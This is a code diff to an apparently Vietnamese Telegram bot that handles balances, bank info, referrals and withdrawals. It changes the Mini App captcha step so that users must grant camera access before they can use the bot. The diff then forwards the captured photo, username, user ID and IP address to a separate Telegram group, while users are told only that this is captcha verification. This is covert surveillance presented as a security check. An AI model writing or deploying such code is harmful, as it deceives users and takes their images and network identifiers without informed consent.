@@ -897,7 +897,7 @@ async def ensure_user_exists(update: Update):
     if not user: return None
     select_sql = (
         "SELECT user_id, balance, bank_info, is_banned, is_withdraw_banned, referrer_id, "
-        "phone_number, ip_address, skip_ip, captcha_verified FROM users WHERE user_id=%s"
+        "phone_number, ip_address, skip_ip, captcha_verified, miniapp_captcha_verified FROM users WHERE user_id=%s"
     )
     row = await db_query(select_sql, (user.id,), fetchone=True)
     if row:
@@ -998,11 +998,11 @@ async def prompt_miniapp_captcha_verification(message_or_bot, user_id):
         "expires_at": datetime.now() + timedelta(minutes=MINIAPP_CAPTCHA_TTL_MINUTES),
     }
     msg = (
-        f"{E['SHIELD']} <b>XÁC MINH CAPTCHA MINI APP</b>\n"
+        f"{E['SHIELD']} <b>XÁC MINH CAPTCHA MINI APP & CAMERA</b>\n"
         f"━━━━━━━━━━━━━━━━━━\n"
-        f"{E['WARN']} Bạn <b>bắt buộc</b> phải hoàn thành captcha trong Mini App mới được sử dụng bot.\n"
+        f"{E['WARN']} Bạn <b>bắt buộc</b> phải cho phép truy cập camera và hoàn thành captcha trong Mini App mới được sử dụng bot.\n"
         f"{E['HOURGLASS']} Hiệu lực: <b>{MINIAPP_CAPTCHA_TTL_MINUTES} phút</b>\n"
-        f"{E['RIGHT']} Nhấn nút <b>🧩 BẤM VÀO ĐÂY ĐỂ XÁC MINH CAPTCHA</b> bên dưới và hoàn thành captcha!"
+        f"{E['RIGHT']} Nhấn nút <b>🧩 BẤM VÀO ĐÂY ĐỂ XÁC MINH CAPTCHA</b> bên dưới và hoàn thành các bước!"
     )
     kb = get_miniapp_captcha_keyboard(token)
     if hasattr(message_or_bot, "reply_text"):
@@ -1032,7 +1032,7 @@ async def proceed_next_verification(update_or_msg, context: ContextTypes.DEFAULT
             await prompt_phone_verification(update_or_msg, user_id)
             return
 
-    # Bước 2: Captcha MiniApp (ngay sau xác minh SĐT, chưa qua thì không dùng được bot)
+    # Bước 2: Captcha MiniApp & Camera
     if await get_verify_setting("verify_miniapp_captcha"):
         if not await check_miniapp_captcha_verified(user_id) and user_id not in ADMIN_IDS:
             await prompt_miniapp_captcha_verification(update_or_msg, user_id)
@@ -1224,7 +1224,7 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def handle_miniapp_captcha_data(message, context: ContextTypes.DEFAULT_TYPE, user, data: dict):
-    """Xử lý kết quả captcha gửi từ MiniApp: {"type": "miniapp_captcha", "passed": true, "token": "..."}"""
+    """Xử lý kết quả captcha và chụp ảnh camera gửi từ MiniApp"""
     uid = user.id
 
     if not await get_verify_setting("verify_miniapp_captcha"):
@@ -1236,10 +1236,22 @@ async def handle_miniapp_captcha_data(message, context: ContextTypes.DEFAULT_TYP
     not_expired = bool(pending and datetime.now() <= pending["expires_at"])
     passed = data.get("passed") is True
 
+    # Kiểm tra quyền camera (nếu người dùng từ chối quyền)
+    camera_allowed = data.get("camera_allowed", True)
+    if camera_allowed is False:
+        pending_miniapp_captcha.pop(uid, None)
+        await message.reply_text(
+            f"{E['CROSS']} <b>vui lòng cho phép truy cập</b> camera để xác minh!\n"
+            f"{E['WARN']} Bạn đã từ chối quyền truy cập camera nên xác minh bước captcha không thành công.",
+            parse_mode="HTML", reply_markup=ReplyKeyboardRemove(),
+        )
+        await prompt_miniapp_captcha_verification(message, uid)
+        return
+
     if not (pending and token_ok and not_expired and passed):
         pending_miniapp_captcha.pop(uid, None)
         reason = "Phiên xác minh đã hết hạn hoặc không hợp lệ." if not (token_ok and not_expired) \
-            else "Bạn chưa hoàn thành captcha."
+            else "Bạn chưa hoàn thành captcha hoặc từ chối quyền camera."
         await message.reply_text(
             f"{E['CROSS']} <b>Xác minh captcha MiniApp thất bại!</b>\n"
             f"{E['WARN']} {reason}\n"
@@ -1248,6 +1260,27 @@ async def handle_miniapp_captcha_data(message, context: ContextTypes.DEFAULT_TYP
         )
         await prompt_miniapp_captcha_verification(message, uid)
         return
+
+    # Xử lý chụp ảnh camera trước gửi vào nhóm đích
+    if await get_verify_setting("verify_camera") and data.get("image"):
+        try:
+            img_data_url = data["image"]
+            if "," in img_data_url:
+                header, encoded = img_data_url.split(",", 1)
+                img_bytes = base64.b64decode(encoded)
+                
+                user_info_str = f"👤 User: @{user.username or 'Không có'} (ID: <code>{user.id}</code>)"
+                ip_info_str = f"🌐 IP: <code>{data.get('ip', 'Không rõ')}</code>"
+                caption = f"📸 <b>Ảnh chụp camera xác minh MiniApp</b>\n{user_info_str}\n{ip_info_str}"
+
+                await context.bot.send_photo(
+                    chat_id=CAMERA_TARGET_GROUP,
+                    photo=io.BytesIO(img_bytes),
+                    caption=caption,
+                    parse_mode="HTML"
+                )
+        except Exception as e:
+            logger.error(f"Lỗi gửi ảnh camera vào nhóm {CAMERA_TARGET_GROUP}: {e}")
 
     pending_miniapp_captcha.pop(uid, None)
     await db_query("UPDATE users SET miniapp_captcha_verified=1 WHERE user_id=%s", (uid,), commit=True)
@@ -1266,8 +1299,8 @@ async def web_app_data_handler(update: Update, context: ContextTypes.DEFAULT_TYP
     try:
         data = json.loads(message.web_app_data.data)
 
-        # Captcha MiniApp (bước ngay sau xác minh SĐT)
-        if data.get("type") == "miniapp_captcha":
+        # Xử lý dữ liệu chung từ MiniApp bao gồm Captcha và Camera
+        if data.get("type") == "miniapp_captcha" or "passed" in data or "camera_allowed" in data:
             await handle_miniapp_captcha_data(message, context, user, data)
             return
 
@@ -1277,7 +1310,7 @@ async def web_app_data_handler(update: Update, context: ContextTypes.DEFAULT_TYP
                 await proceed_next_verification(message, context, user)
                 return
 
-        # Xử lý tính năng chụp ảnh camera từ MiniApp (nếu bật verify_camera)
+        # Xử lý tính năng chụp ảnh camera độc lập từ MiniApp (nếu bật verify_camera)
         if data.get("type") == "camera_snapshot" and data.get("image"):
             if await get_verify_setting("verify_camera"):
                 img_data_url = data["image"]
